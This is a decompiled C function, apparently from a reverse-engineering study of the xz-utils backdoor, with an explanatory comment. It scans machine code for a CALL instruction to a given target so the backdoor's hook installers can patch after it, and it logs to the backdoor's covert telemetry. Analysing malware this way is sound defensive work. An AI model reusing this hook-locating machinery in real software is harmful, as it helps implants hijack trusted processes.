// /home/kali/xzre-ghidra/xzregh/100C90_find_call_instruction.c
// Function: find_call_instruction @ 0x100C90
// Calling convention: __stdcall
// Prototype: BOOL __stdcall find_call_instruction(u8 * code_start, u8 * code_end, u8 * call_target, dasm_ctx_t * dctx)


/*
 * AutoDoc: Emits a secret-data telemetry record, then decodes forward using a scratch or caller-supplied context.
 * Decode failures advance a single byte; successes advance by `instruction_size` until the normalised CALL opcode (`0x168`) is seen, and when `call_target` is provided the rel32 destination (`instruction + instruction_size + operand`) must match it.
 * Returns TRUE with `dctx` still describing the CALL so hook installers can patch immediately after it.
 */

#include "xzre_types.h"

BOOL find_call_instruction(u8 *code_start,u8 *code_end,u8 *call_target,dasm_ctx_t *dctx)

{
  BOOL decode_ok;
  long clear_idx;
  dasm_ctx_t *zero_ctx;
  byte clear_stride_marker;
  dasm_ctx_t scratch_ctx;
  
  clear_stride_marker = 0;
  decode_ok = secret_data_append_from_address((void *)0x0,(secret_data_shift_cursor_t)0x81,4,7);
  if (decode_ok != FALSE) {
    zero_ctx = &scratch_ctx;
    for (clear_idx = 0x16; clear_idx != 0; clear_idx = clear_idx + -1) {
      *(undefined4 *)&zero_ctx->instruction = 0;
      zero_ctx = (dasm_ctx_t *)((long)zero_ctx + ((ulong)clear_stride_marker * -2 + 1) * 4);
    }
    if (dctx == (dasm_ctx_t *)0x0) {
      dctx = &scratch_ctx;
    }
    while (code_start < code_end) {
      decode_ok = x86_dasm(dctx,code_start,code_end);
      if (decode_ok == FALSE) {
        code_start = code_start + 1;
      }
      else {
        if ((*(int *)(dctx->opcode_window + 3) == 0x168) &&
           ((call_target == (u8 *)0x0 ||
            (dctx->instruction + dctx->instruction_size + dctx->imm_signed == call_target)))) {
          return TRUE;
        }
        code_start = code_start + dctx->instruction_size;
      }
    }
  }
  return FALSE;
}

